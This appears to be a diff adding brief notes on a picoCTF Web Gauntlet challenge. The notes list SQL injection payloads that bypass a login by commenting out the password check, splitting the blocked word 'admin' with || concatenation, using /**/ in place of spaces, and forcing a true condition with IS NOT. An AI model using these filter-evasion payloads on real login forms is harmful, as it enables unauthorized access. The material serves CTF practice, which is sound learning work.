@@ -1,0 +1,28 @@
+--------------------------------------------------------------------------------------------------------------
+
+https://sqliteonline.com/
+
+PICOCTF: WEBGauntlet 1:
+username = admin'-- - ...
+username = admin'/* ...
+
+'/**/||/**/'a'/**/||/**/'dmin'/*
+    - here the word "admin" was blacklisted, so we had to use concatenation using the "||",
+    on top of that SPACES were also blacklisted, so we had to use /**/ to represent spaces
+
+--------------------------------------------------------------------------------------------------------------
+
+
+
+SELECT username, password FROM users WHERE username=' || 'a' || 'dmin' AND WHERE password=password
+
+
+
+https://www.sqlite.org/lang_expr.html
+so there are other operators that we can use. We can't use != but we can use IS NOT
+
+http://mercury.picoctf.net:65261/index.php
+SELECT username, password FROM users WHERE username='admi' || 'n' AND password='c' IS NOT 'y'
+username: admi' || 'n
+password: c' IS NOT 'y
+
